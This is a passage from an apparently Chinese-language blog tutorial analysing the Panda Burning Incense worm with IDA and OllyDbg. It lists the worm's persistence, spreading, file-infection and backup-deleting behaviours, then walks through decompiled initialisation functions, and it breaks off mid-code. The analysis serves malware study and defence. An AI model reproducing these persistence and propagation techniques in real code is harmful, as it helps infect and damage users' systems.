share”解除共享功能</li><li>删除安全类软件在注册表中自启动项</li><li>在注册表<code>CurrentVersion\Run</code>创建<code>svcshare</code>自启动项，每次开机时会自动运行病毒</li><li>禁用文件夹隐藏选项，修改注册表使得隐藏文件无法通过普通设置显示，从而隐藏病毒自身</li><li>将自身拷贝到每个磁盘的根目录下并命名为<code>setup.exe</code>，创建<code>autorun.inf</code>用于病毒的启动，这两个文件的属性都是“隐藏”。同时，会创建<code>Desktop_.ini</code>隐藏文件</li><li>向局域网发送并接收信息，并不断尝试向外进行连接和发送数据包</li></ol><p>我们已经基本分析了熊猫烧香的病毒行为，但这些行为仍然无法彻底了解病毒的行为，还需要通过OllyDbg逆向分析和IDA静态分析来实现。同时，熊猫烧香病毒还有一些其他的行为，包括：</p><ul><li>感染EXE文件，病毒会搜索并感染系统中特定目录外的所有EXE/SCR/PIF/COM文件，并将EXE执行文件的图标改为熊猫烧香的图标。</li><li>试图用以弱口令访问局域网共享文件夹，如果发现弱口令共享，就将病毒文件拷贝到该目录下，并改名为<code>GameSetup.exe</code>，以达到通过局域网传播的功能。</li><li>查找系统以<code>.html</code>和<code>.asp</code>为后缀的文件并在里面插入iframe，该网页中包含在病毒程序，一旦用户使用了未安装补丁的IE浏览器访问该网页就可能感染该病毒。</li><li>删除扩展名为gho的文件，该文件是系统备份工具GHOST的备份文件，这样可使用户的系统备份文件丢失。</li></ul><h1 id="5-动静结合分析样本——病毒初始化"><a href="#5-动静结合分析样本——病毒初始化" class="headerlink" title="5. 动静结合分析样本——病毒初始化"></a>5. 动静结合分析样本——病毒初始化</h1><p>栈上给局部变量分配空间的时候，栈是向下增长的，而栈上的数组、字符串、结构体等却是向上增长的。理解这一点可以帮助识别栈上的变量。</p><p>在分析病毒之前，首先需要调用工具检查病毒是否带壳，如果带壳还需要先进行脱壳操作。程序无壳，采用Borland Delphi 6.0-7.0编写的32位EXE文件。</p><img src="/posts/a48809a5/5.1.1.png" class="" title="查壳"><p>先将样本载入IDA，查看伪代码。</p><img src="/posts/a48809a5/5.1.2.png" class="" title="主函数伪代码"><img src="/posts/a48809a5/5.1.3.png" class="" title="主函数伪代码"><p>由于我第一次分析样本，所以这个样本我会事无巨细地分析，看看我能分析到什么程度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>样本主函数的第1行代码，<code>__noreturn</code>关键字，顾名思义，不返回，表明调用完成后函数不返回主调函数。注意，这与 void 返回类型不同。void 类型的函数在执行完毕后返回主调函数，只是它不提供返回值。这太容易理解了，因为<code>start()</code>本身就是主调函数，还能返回到哪里去？</p><p>第17行代码的<code>sub_40CA98()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_40CA98</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6, <span class="type">int</span> a7, <span class="type">int</span> a8, <span class="type">int</span> a9, <span class="type">int</span> a10, <span class="type">int</span> a11, <span class="type">int</span> a12, <span class="type">int</span> a13, <span class="type">int</span> a14, <span class="type">int</span> a15, <span class="type">int</span> a16)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr[<span class="number">2</span>]; <span class="comment">// [sp+0h] [bp+0h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> MK_FP(retaddr[<span class="number">0</span>], retaddr[<span class="number">0</span>])(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__stdcall</code>是<strong>函数调用约定</strong>的一种，它的主要特征是：</p><ul><li>参数都是<strong>从右向左通过堆栈传递</strong>的</li><li>函数的<strong>堆栈平衡操作是由被调用函数执行</strong>的，比如函数调用在返回前要由被调用函数清理堆栈</li><li>在函数名的前面用下划线修饰，在函数名的后面由@来修饰并加上栈需要的字节数的空间，比如<code>_sumExample@8</code></li></ul><p>函数调用约定主要约束了两件事：</p><ol><li>参数的传递顺序</li><li>调用堆栈由谁(调用函数或被调用函数)清理</li></ol><p>常见的函数调用约定有：<code>__stdcall</code>、<code>__cdecl</code>、<code>__fastcall</code>、<code>__thiscall</code>、<code>__nakedcall</code>、<code>__passcal</code>、<code>__vectorcall</code>。</p><p>在<code>sub_40CA98()</code>中，传入了16个整型变量，在压栈过程中，顺序应该为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push a16</span><br><span class="line">push a15</span><br><span class="line">...</span><br><span class="line">push a1</span><br></pre></td></tr></table></figure><p>最后也是由<code>sub_40CA98()</code>函数pop这16个整型变量。</p><p>双击该函数中的<code>void *retaddr[2];</code>弹出一个<code>Stack of sub_40CA98</code>窗口，对该定义变量进行了一些说明。</p><img src="/posts/a48809a5/5.1.4.png" class="" title="Stack of sub_40CA98"><p>“*”表示一个数组。使用数据定义命令创建局部变量和函数参数。两个特殊字段“r”和“s”表示返回地址和保存的寄存器。</p><p><code>void *retaddr[2];</code>表示定义了一个有2个元素的数组，它的BP(基址指针寄存器)从偏移为0开始，SP(堆栈指针寄存器)从偏移为0开始。</p><p><code>MK_FP</code>是一个宏，功能是做段基址加上偏移地址的运算，也就是取实际地址。其函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MK_FP( seg,ofs )( (void _seg * )( seg ) +( void near * )( ofs ))</span></span><br></pre></td></tr></table></figure><p>在该函数中，<code>MK_FP</code>如果想要<code>retaddr[]</code>作为参数传入，<code>MK_FP</code>第1个括号中的两个参数都应该填数组的首地址(因为seg=[BP+0]，刚好是数组的首地址；ofs=[SP+0]，也是数组的首地址)。后面跟着的参数的偏移地址在此基础上往上递增。</p><p>鼠标移到变量a1会发现它的偏移为[BP+8] [SP+8]，说明<code>retaddr[]</code>共占8个字节，里面的两个元素很有可能也是int类型。</p><p>第17行代码的<code>sub_4049E8()</code>函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx@1</span></span><br><span class="line">  HMODULE v3; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  TlsIndex = <span class="number">0</span>;</span><br><span class="line">  v3 = GetModuleHandleA(<span class="number">0</span>);</span><br><span class="line">  dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">  dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">  dword_40D0C0 = <span class="number">0</span>;</span><br><span class="line">  sub_4049DC();</span><br><span class="line">  <span class="keyword">return</span> sub_403980(v2, (<span class="type">int</span>)&amp;unk_40D0B4, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__usercall</code>表示用户自定义函数调用约定，用户可以显式指定参数和返回值的位置。比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_4049E8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebp&gt;)</span><br></pre></td></tr></table></figure><p>表示函数有两个参数：第一个参数通过eax寄存器传递，第二个参数通过ebp寄存器传递，返回值保存在eax寄存器中。</p><p>用户自定义函数调用约定的一般规则如下：</p><ul><li><p>返回值必须位于寄存器中</p></li><li><p>如果返回值类型是void，不能指定返回值的位置</p></li><li><p>如果参数的位置没有指定，假设参数通过堆栈传递</p></li><li><p>可以允许嵌套声明，如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **__usercall func16@&lt;eax&gt;(<span class="type">int</span> *(__usercall *x)@&lt;ebx&gt; (<span class="type">int</span>, <span class="type">long</span>@&lt;ecx&gt;, <span class="type">int</span>)@&lt;esi&gt;);</span><br></pre></td></tr></table></figure></li><li><p>用于指定位置名的寄存器必须在当前处理器中有效</p></li><li><p>寄存器对可以像这样 \<edx:eax\> 用冒号的形式指定</p></li><li><p><strong>由调用者清理堆栈</strong></p></li></ul><p>该函数的第8行代码有一个API函数，原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HMODULE <span class="title function_">GetModuleHandleA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR lpModuleName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>功能是加载模块的名称（.dll或.exe文件）。如果省略了文件名扩展名，则将附加默认库扩展名.dll。文件名字符串可以包括一个尾点字符（.），以指示模块名称没有扩展名。字符串不必指定路径。指定路径时，请确保使用反斜线（\），而不是正斜线（/）。将名称（大小写独立）与当前映射到调用过程地址空间的模块的名称进行比较。</p><p>如果<code>lpModuleName</code>参数为null，则<code>GetModuleHandle()</code>将返回用于创建调用过程（.exe文件）的文件的句柄。</p><p>如果函数成功，则返回值是指定模块的句柄。如果函数失败，则返回值为null。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40E650 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0B8 = (<span class="type">int</span>)v3;</span><br><span class="line">dword_40D0BC = <span class="number">0</span>;</span><br><span class="line">dword_40D0C0 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这些是写入数据段的操作，暂时可以不管。</p><p>再看<code>sub_4049DC()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">sub_4049DC</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4046F0(&amp;unk_40D0B4);<span class="comment">//将40D0B4这个地址作为参数传入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_DWORD *__usercall sub_4046F0@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  *result = dword_40D028;<span class="comment">//在40D0B4地址中存入40D028地址的数据</span></span><br><span class="line">  dword_40D028 = (<span class="type">int</span>)result;<span class="comment">//在40D028地址中存入40D0B4这个地址</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能是把地址40D0B4作为媒介，使得40D028能通过40D0B4找回自己原本存的值。</p><p><code>sub_403980()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_403980@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_40E010 = (<span class="type">int</span>)RaiseException;</span><br><span class="line">  dword_40E014 = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))RtlUnwind;</span><br><span class="line">  dword_40E628 = a1;</span><br><span class="line">  dword_40E62C = <span class="number">0</span>;</span><br><span class="line">  dword_40E630 = a2;</span><br><span class="line">  dword_40E01C = *(_DWORD *)(a2 + <span class="number">4</span>);</span><br><span class="line">  sub_403878(a3);</span><br><span class="line">  byte_40E024 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> sub_403920();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>RaiseException()</code>是用来抛出一个调用线程时发生的异常。</p><p><code>RtlUnwind()</code>遍历访问异常帧链表，把从表头帧到目标帧（不含）的所有异常处理回调函数用异常码（STATUS_UNWIND 即0C0000027H）、异常标志（EXCEPTION_UNWINDING即值2）调用。</p><p>下面等等那些函数基本不用看了(我累了)，因为我们发现一整个<code>sub_4049E8()</code>函数只是在进行初始化操作。一般入口第一个函数就是做初始化操作的。</p><p>回到主函数的<code>__readfsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __readfsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>参数：从最初读取的 FS 的偏移量。</p><p>返回值：字节、字、双字或多次字长的内存内容 (如指示名为调用的函数) 在位置 FS:[Offset]。</p><p><code>__writefsdword()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __writefsdword( </span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Offset, <span class="comment">//从最初 FS 的偏移量写入</span></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">long</span> Data <span class="comment">//要写入的值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="5-1-sub-403C98函数分析"><a href="#5-1-sub-403C98函数分析" class="headerlink" title="5.1 sub_403C98函数分析"></a>5.1 sub_403C98函数分析</h2><p>主函数调用了两次<code>sub_403C98()</code>，那先来看它传入的参数是什么类型的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;dword_40E7D4, (<span class="type">signed</span> __int32)dword_40CC40);</span><br><span class="line">sub_403C98((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;unk_40E7D8, (<span class="type">signed</span> __int32)dword_40CC6C);</span><br></pre></td></tr></table></figure><p><code>volatile</code>关键字的作用是：编译器在用到这个关键字修饰的变量时必须每次都重新读取这个变量的值，而不是使用保存在寄存器里的备份。</p><p>第一个参数是整数指针类型，在BSS段；第二个参数是整型，移到它上面能看到它是一个整型数组，在CODE段。</p><p>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是可读可写，在程序执行之前BSS段会自动清0。所以，未初始的全局变量在程序执行之前已经成0了。</p><p>CODE段，代码段又称文本段，用来存放指令，运行代码的一块内存空间，此空间大小在代码运行前就已经确定，内存空间一般属于只读，某些架构的代码也允许可写。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p><p>点进<code>sub_403C98()</code>查看函数调用约定，用的<code>__usercall</code>修饰，第一个参数存入eax，第二参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">signed</span> __int32 *__usercall sub_403C98@&lt;eax&gt;(<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *result@&lt;eax&gt;, <span class="type">signed</span> __int32 a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p>现在看第一个<code>sub_403C98()</code>，<code>&amp;dword_40E7D4</code>表示将地址40E7D4存入eax，<code>dword_40CC40</code>表示将地址40CC40的内容存入edx。那么地址40CC40中的内容是什么呢？需要用OD进行调试。</p><img src="/posts/a48809a5/5.1.5.png" class="" title="查看地址40CC40的内容"><p>可以看到“武汉男生感染下载者”等等一些内容，这就是病毒作者的信息。早些年病毒作者出于炫耀目的，都会加入一些自己的特征。同样，现在APT攻击溯源也会通过文件路径等获取病毒作者的信息。</p><p>接下来进入这个函数分析，看IDA真的折磨，先把几个系统调用的东西看懂了。</p><img src="/posts/a48809a5/5.1.6.png" class="" title="sub_403C98()函数分析"><p><code>__OFADD__</code>是一个宏，它的作用是测试两个数相加是否溢出，返回溢出标志位；<code>__OFSUB__</code>同理。</p><p><code>_InterLockedIncrement()</code>、<code>_InterLockedDecrement()</code>的功能是实现数的原子性加减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedIncrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in，out]指向要递增的变量的指针,返回值是生成的递增值</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> _InterlockedDecrement(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * lpAddend<span class="comment">//[in， out]指向要减数的变量的易失指针,返回值是生成的递减值</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><code>_InterlockedExchange()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> _InterlockedExchange(</span><br><span class="line">   <span class="type">long</span> <span class="keyword">volatile</span> * Target,</span><br><span class="line">   <span class="type">long</span> Value</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>相关参数：</p><ul><li>Target：[in，out]指向要交换的值的指针。 此函数会将此变量设置为<code>Value</code>并返回其之前的值。</li><li>Value：[in]要与指向的值交换的值<code>Target</code>。</li></ul><p>返回值：返回由<code>Target</code>指向的初始值。</p><p>为了观察<code>sub_403C98()</code>函数的执行过程，最好结合IDA和OD一步步调试。<code>sub_403C98()</code>中有三个函数：</p><ol><li><code>sub_403D08()</code></li><li><code>sub_402650()</code></li><li><code>sub_402540()</code></li></ol><h3 id="5-1-1-sub-403D08"><a href="#5-1-1-sub-403D08" class="headerlink" title="5.1.1 sub_403D08"></a>5.1.1 sub_403D08</h3><p>将eax和edx入栈，进入函数<code>sub_403D08()</code>。</p><img src="/posts/a48809a5/5.1.7.png" class="" title="sub_403C98()函数分析"><img src="/posts/a48809a5/5.1.8.png" class="" title="sub_403D08()函数分析"><p><code>sub_403D08()</code>中有一个函数，进入函数<code>sub_402520()</code>。<code>sub_402520()</code>中有两个函数：<code>sub_401F4C()</code>和<code>sub_402608()</code>。</p><img src="/posts/a48809a5/5.1.9.png" class="" title="sub_402520()函数分析"><p>进入<code>sub_401F4C()</code>，再进入<code>sub_401860()</code>。</p><img src="/posts/a48809a5/5.1.10.png" class="" title="sub_401F4C()函数分析"><p><code>sub_401860()</code>中，有几个API函数：</p><img src="/posts/a48809a5/5.1.11.png" class="" title="sub_401860()函数分析"><img src="/posts/a48809a5/5.1.12.png" class="" title="sub_401860()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">InitializeCriticalSection</span><span class="params">(<span class="comment">//初始化一个临界资源对象</span></span></span><br><span class="line"><span class="params">    LPCRITICAL_SECTION lpCriticalSection <span class="comment">//临界资源对象指针</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">EnterCriticalSection</span><span class="params">(<span class="comment">//进入临界区</span></span></span><br><span class="line"><span class="params">    __inout LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">LeaveCriticalSection</span><span class="params">( <span class="comment">//离开临界区</span></span></span><br><span class="line"><span class="params">    _Inout_LPCRITICAL_SECTION lpCriticalSection</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">HLOCAL <span class="title function_">LocalAlloc</span><span class="params">(<span class="comment">//堆中分配指定大小的字节数</span></span></span><br><span class="line"><span class="params">    UINT uFlags,</span></span><br><span class="line"><span class="params">    UINT uBytes</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//返回值：成功则返回一个指向新分配的内存对象的句柄。</span></span><br></pre></td></tr></table></figure><p>相关的多线程数据操作函数有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitializeCriticalSection(&amp;cs);<span class="comment">//初始化临界区</span></span><br><span class="line">EnterCriticalSection(&amp;cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="comment">//操作数据</span></span><br><span class="line">MyMoney*=<span class="number">10</span>;<span class="comment">//所有访问MyMoney变量的程序都需要这样写Enter.. Leave...</span></span><br><span class="line">LeaveCriticalSection(&amp;cs);<span class="comment">//离开临界区</span></span><br><span class="line">DeleteCriticalSection(&amp;cs);<span class="comment">//删除临界区</span></span><br></pre></td></tr></table></figure><p>由于临界资源做的是原子操作，不可能人为把它们分开，所以<code>sub_401860()</code>可以不用管，这个函数只是分配一定大小的内存空间而已。</p><p>回到<code>sub_401F4C()</code>，发现又有<code>EnterCriticalSection()</code>和<code>LeaveCriticalSection()</code>，通常它们都是成对出现的，它们之间进行的是原子操作，所以<code>sub_401F4C()</code>也可以不看了。</p><img src="/posts/a48809a5/5.1.13.png" class="" title="sub_401F4C()函数分析"><img src="/posts/a48809a5/5.1.14.png" class="" title="sub_401F4C()函数分析"><p>回到<code>sub_402520()</code>，在执行的过程跳过了<code>sub_402608()</code>函数，可以先在call指令处下个断点，等下次如果运行到这里时可以知道经过了这个函数。</p><img src="/posts/a48809a5/5.1.15.png" class="" title="sub_402520()函数分析"><p>由于<code>sub_403D08()</code>中只有<code>sub_402520()</code>，而<code>sub_402520()</code>也没有其它函数了，所以<code>sub_403D08()</code>基本可以排除它的嫌疑了，它的功能就是分配一定大小的内存空间。</p><h3 id="5-1-2-sub-402650"><a href="#5-1-2-sub-402650" class="headerlink" title="5.1.2 sub_402650"></a>5.1.2 sub_402650</h3><p>在IDA中可以看到<code>sub_402650()</code>的功能是字符串拷贝。</p><img src="/posts/a48809a5/5.1.16.png" class="" title="sub_402650()函数分析"><img src="/posts/a48809a5/5.1.17.png" class="" title="sub_402650()函数分析"><p><code>sub_402540()</code>这个函数被跳过了，先不管。</p><h3 id="5-1-3-总结"><a href="#5-1-3-总结" class="headerlink" title="5.1.3 总结"></a>5.1.3 总结</h3><p>根据上面的分析，可以暂时发现<code>sub_403C98()</code>这个函数有两个功能：</p><ul><li>分配一定大小的内存空间</li><li>将字符串拷贝到分配好的内存空间去</li></ul><p>第二个<code>sub_403C98()</code>显示的字符串是“感谢艾玛…”，也可以帮我们收集病毒制作者的信息。</p><img src="/posts/a48809a5/5.1.18.png" class="" title="sub_403C98()函数分析"><p>为了易于观察，可以在IDA中将<code>sub_403C98()</code>命名为<code>AllocStackAndCopyString()</code>，便于我们理解及分析整个病毒。</p><h2 id="5-2-sub-405360函数分析"><a href="#5-2-sub-405360函数分析" class="headerlink" title="5.2 sub_405360函数分析"></a>5.2 sub_405360函数分析</h2><p>主函数也调用两次<code>sub_405360()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sub_405360((<span class="type">int</span>)dword_40CCA4, (<span class="type">int</span>)<span class="string">&quot;xboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v9);</span><br><span class="line">sub_405360((<span class="type">int</span>)dword_40CCE0, (<span class="type">int</span>)<span class="string">&quot;whboy&quot;</span>, (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;v8);</span><br></pre></td></tr></table></figure><p>第一个参数是整型数组，位于CODE段；第二个参数是字符数组，位于CODE段；第三个是整型指针变量，点进去可以看到它的基本信息。</p><img src="/posts/a48809a5/5.2.1.png" class="" title="参数分析"><p>进去<code>sub_405360()</code>查看它的函数调用约定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_405360@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>是用户自定义函数调用，第一个参数存入eax，第二个参数存入edx，第三个参数存入ecx，返回值存入eax。</p><p>跟<code>sub_403C98()</code>一样步骤，查看几个参数的值，再进去分析这个函数做了什么。</p><img src="/posts/a48809a5/5.2.2.png" class="" title="sub_405360()函数分析"><img src="/posts/a48809a5/5.2.3.png" class="" title="sub_405360()函数分析"><h3 id="5-2-1-sub-403ECC"><a href="#5-2-1-sub-403ECC" class="headerlink" title="5.2.1 sub_403ECC"></a>5.2.1 sub_403ECC</h3><p>根据分析，<code>sub_403ECC()</code>前面的call都是进行初始化寄存器的操作，可以不管。</p><img src="/posts/a48809a5/5.2.4.png" class="" title="sub_405360()函数分析"><p>进入到<code>sub_403ECC()</code>后，eax的值从字符串变为0x20。</p><img src="/posts/a48809a5/5.2.5.png" class="" title="sub_403ECC()函数分析"><p>想弄清楚这个0x20是怎么来的，结果发现样本载入OD时数据窗口就已经存有了0x20。再仔细看数据窗口，结合“xboy”前4个字节的值是4，不难猜测那一串字符的前4个字节的值0x20是字符串的长度。所以这个函数勉强可以算为求字符串的长度，将它更名为<code>StringLen()</code>。</p><p>其实，凡是由Delphi编写的程序，它会在字符串-4的位置保存这个字符串的长度。</p><h3 id="5-2-2-进入循环"><a href="#5-2-2-进入循环" class="headerlink" title="5.2.2 进入循环"></a>5.2.2 进入循环</h3><p>这里面有几个陌生的指令，先学习一下。</p><p>cdq：使用eax的最高位扩展edx的所有位，将eax扩展为64位，edx:eax</p><p>div：无符号除法，被除数为eax，结果的商存放在eax中，余数存放在edx中</p><p>idiv：有符号除法，在32位系统中进行64 / 32位除法，即被除数为64位，除数为32位。结果的商存放在eax中，余数存放在edx中</p><p>movzx：一般用于将较小值拷贝到较大值中</p><img src="/posts/a48809a5/5.2.6.png" class="" title="循环分析"><p>第一次循环运行到<code>sub_403E2C()</code>后，分析如下：</p><img src="/posts/a48809a5/5.2.7.png" class="" title="循环分析"><h4 id="5-2-2-1-sub-403E2C"><a href="#5-2-2-1-sub-403E2C" class="headerlink" title="5.2.2.1 sub_403E2C"></a>5.2.2.1 sub_403E2C</h4><p>进入<code>sub_403E2C()</code>后发现有<code>sub_403D34()</code>函数。</p><img src="/posts/a48809a5/5.2.8.png" class="" title="sub_403E2C()函数分析"><p>再进去，发现这几个函数我们上面都有分析过，总体来说是进行字符串拷贝操作，所以将<code>sub_403D34()</code>命名为<code>StringCopy()</code>。</p><img src="/posts/a48809a5/5.2.9.png" class="" title="sub_403D34()函数分析"><p>返回到父函数，继续看下一个。</p><h4 id="5-2-2-2-sub-403ED4"><a href="#5-2-2-2-sub-403ED4" class="headerlink" title="5.2.2.2 sub_403ED4"></a>5.2.2.2 sub_403ED4</h4><p>在<code>sub_403ED4()</code>中，有一个跳转实现了，去到<code>sub_403C98()</code>，这不就是我们上面分析的主函数的第一个函数吗，它的作用是分配内存空间和字符串拷贝。</p><img src="/posts/a48809a5/5.2.10.png" class="" title="sub_403ED4()函数分析"><p>此时，eax的值为<code>0x13FF80</code>，edx的值为<code>0xB10068</code>，执行<code>sub_403C98()</code>的意思是将地址B10068拷贝到地址13FF80中去。</p><img src="/posts/a48809a5/5.2.11.png" class="" title="sub_403ED4()函数分析"><img src="/posts/a48809a5/5.2.12.png" class="" title="sub_403ED4()函数分析"><p>跳转未实现，需要进入<code>sub_4041FC()</code>函数进行分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall 